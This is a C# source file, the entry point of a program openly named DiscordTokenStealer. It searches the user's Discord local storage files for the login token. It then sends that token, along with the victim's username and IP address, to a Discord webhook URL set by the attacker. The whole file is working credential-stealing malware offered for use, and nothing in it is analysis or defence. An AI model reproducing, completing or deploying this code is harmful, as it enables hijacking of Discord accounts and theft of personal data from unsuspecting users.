using DiscordTokenStealer.Properties;
using System;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Windows.Forms;

namespace DiscordTokenStealer
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            bool flag2 = !Stealer.FindLdb(ref text) && !Stealer.FindLog(ref text);
            if (flag2)
            {
                Program.SendWebHook("Token not found in victim's pc");
            }
            Thread.Sleep(100);
            string text2 = Stealer.GetToken(text, text.EndsWith(".log"));
            bool flag3 = text2 == "";
            if (flag3)
            {
                text2 = "Token not found in victim's pc";
            }
            Program.SendWebHook(text2);
        }
        private static void SendWebHook(string token)
        {
            if(Settings.Default.AvatarUrl == null || Settings.Default.WebhookUrl == null)
            {
                MessageBox.Show("You didn't fill the settings!", "Token Stealer", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            WebRequest.DefaultWebProxy = new WebProxy();
            HttpClient httpClient = new HttpClient();
            MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
            multipartFormDataContent.Add(new StringContent("Token Stealer"), "username");
            multipartFormDataContent.Add(new StringContent(Settings.Default.AvatarUrl), "avatar_url");
            multipartFormDataContent.Add(new StringContent(string.Concat(new string[]
            {
                "Token from (pc name): ",
                Environment.UserName,
                " | IP : ",
                Stealer.GetIP(),
                "\r\nToken: ",
                token
            })), "content");
            try
            {
                HttpResponseMessage result = httpClient.PostAsync(Settings.Default.WebhookUrl, multipartFormDataContent).Result;
            }
            catch (Exception)
            {
            }
        }
    }
}
